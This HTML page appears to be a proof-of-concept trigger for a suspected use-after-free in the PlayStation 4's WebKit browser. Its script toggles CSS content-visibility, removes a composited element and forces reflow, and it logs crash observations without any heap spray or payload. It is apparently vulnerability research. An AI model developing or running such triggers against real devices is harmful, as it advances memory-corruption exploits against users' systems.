<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>PS4 WebKit PoC - RenderLayer content-visibility toggle + remove</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: monospace; margin: 0; padding: 12px; }
    .row { margin: 8px 0; }
    button { padding: 10px 12px; margin-right: 8px; }
    #log { white-space: pre-wrap; border: 1px solid #ccc; padding: 8px; height: 260px; overflow: auto; }

    .container {
      position: relative;
      width: 95vw;
      height: 55vh;
      overflow: hidden;
      border: 2px solid #444;
      margin-top: 12px;
      /* content-visibility será alternado via JS */
    }
    .child {
      width: 140px;
      height: 140px;
      background: #09f;
      position: absolute;
      left: 20px;
      top: 20px;

      /* força composição em muitos WebKit */
      transform: translateZ(0);
      will-change: transform;
    }
  </style>
</head>
<body>

  <h3>PS4 WebKit - RenderLayer recompute candidate (content-visibility + DOM removal)</h3>

  <div class="row">
    <button id="one">Trigger once</button>
    <button id="multi">Trigger 20x</button>
    <button id="reset">Reset DOM</button>
    <button id="clear">Clear log</button>
  </div>

  <div class="row">
    <b>UA:</b> <span id="ua"></span>
  </div>

  <div id="log"></div>

  <div class="container" id="container">
    <div class="child" id="child"></div>
  </div>

<script>
(function () {
  const logEl = document.getElementById('log');
  const uaEl = document.getElementById('ua');
  uaEl.textContent = navigator.userAgent;

  function debug_log(msg) {
    const ts = new Date().toLocaleTimeString();
    logEl.textContent += `[${ts}] ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
  }

  const container = document.getElementById("container");

  function getChild() {
    return document.getElementById("child");
  }

  function setCV(value) {
    // tenta ambas as grafias (alguns builds expõem prefixed)
    container.style.contentVisibility = value;
    container.style.webkitContentVisibility = value;
  }

  function forceReflow() {
    // força flush de layout/estilo
    void container.offsetHeight;
    void document.body.offsetHeight;
  }

  function resetDOM() {
    // recria o child se ele não existir
    let child = getChild();
    if (child) child.remove();

    child = document.createElement('div');
    child.className = 'child';
    child.id = 'child';
    container.appendChild(child);

    setCV('auto');
    forceReflow();
    debug_log("DOM reset: child recriado e content-visibility=auto");
  }

  function triggerOnce() {
    const child = getChild();
    if (!child) {
      debug_log("child já não existe; use Reset DOM antes.");
      return;
    }

    debug_log("triggerUAF(): set content-visibility=hidden");
    setCV("hidden");
    forceReflow();

    debug_log("triggerUAF(): removing child");
    child.remove();
    forceReflow();

    // igual à PoC: recompute via setTimeout(0)
    setTimeout(() => {
      debug_log("triggerUAF(): restoring content-visibility=auto");
      setCV("auto");
      forceReflow();

      debug_log("Done. Observe: glitch/crash/freeze? (sem heap spray)");
    }, 0);
  }

  async function triggerMany(n) {
    debug_log(`Starting ${n} iterations...`);
    for (let i = 1; i <= n; i++) {
      debug_log(`--- iter ${i}/${n} ---`);
      resetDOM();
      triggerOnce();

      // pequena pausa para permitir recompute real
      await new Promise(r => setTimeout(r, 50));
    }
    debug_log("Finished iterations.");
  }

  document.getElementById('one').onclick = () => triggerOnce();
  document.getElementById('multi').onclick = () => triggerMany(20);
  document.getElementById('reset').onclick = () => resetDOM();
  document.getElementById('clear').onclick = () => { logEl.textContent = ""; };

  // init
  resetDOM();
})();
</script>

</body>
</html>
